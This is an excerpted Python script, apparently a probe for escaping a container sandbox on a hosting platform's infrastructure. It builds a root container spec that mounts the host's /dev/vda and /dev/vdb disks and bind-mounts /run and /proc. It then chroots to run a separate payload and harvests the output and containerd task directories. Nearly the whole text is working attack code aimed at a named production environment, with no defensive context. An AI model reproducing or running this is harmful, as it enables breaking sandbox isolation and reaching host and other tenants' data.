...
PAYLOAD = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vda190_probe_guest.py'), 'rb').read()
...
def make_spec(cid, with_pid_ns):
    ...
    spec = {
        ...
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V99_START $$ > /tmp/v190c2.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v190c2.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v190c2.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v190c2.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v190c2.out;"
                     " timeout 8 mount /dev/vda /mnt/g/mnt/h 2>&1; echo VDA_RC=$? >> /mnt/g/vercel/sandbox/v190c2.out;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v190_payload.py "
                     ">> /mnt/g/vercel/sandbox/v190c2.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v190c2.out;"
                     "fi;"
                     "echo V99_END >> /mnt/g/vercel/sandbox/v190c2.out 2>&1;"
                     "sleep 99999"],
...
def run_container(CSP, sk, with_pid_ns):
    CID = 'v190a' if with_pid_ns else 'v190b'
...
def main():
    ...
    IMAGE = '977805900190.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1908be914dc973663ab50e48d0045087340cc71cf903e2841b59'

    pf = '/vercel/sandbox/v190_payload.py'
    try:
    ...
    while t_wait < 300 and not done:
        time.sleep(0.3)
        t_wait += 1
        try:
            fp = '/vercel/sandbox/v190c2.out'
            cur = ''
            if os.path.exists(fp):
                cur = open(fp, errors='replace').read()
            if cur != seen:
                new = cur[len(seen):] if cur.startswith(seen) else cur
                seen = cur
                log('--- COW v190c2.out @%ds +%d ---\n%s' % (t_wait, len(new), new))
            if 'V190_DONE' in cur or 'V99_END' in cur:
                done = True
        except Exception as e:
            log('poll COW EXC %s' % e)

    # payload 完成太快时全量补录 (防截断丢关键段)
    try:
        full = open('/vercel/sandbox/v190c2.out', errors='replace').read()
        if len(full) > len(seen):
            log('--- COW v190c2.out FULL +%d ---\n%s' % (len(full) - len(seen), full[len(seen):]))
    except Exception as e:
        log('read full EXC %s' % e)

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d == 'v190a' or d == 'v190b':
                targets.append(d)
    except Exception as e:
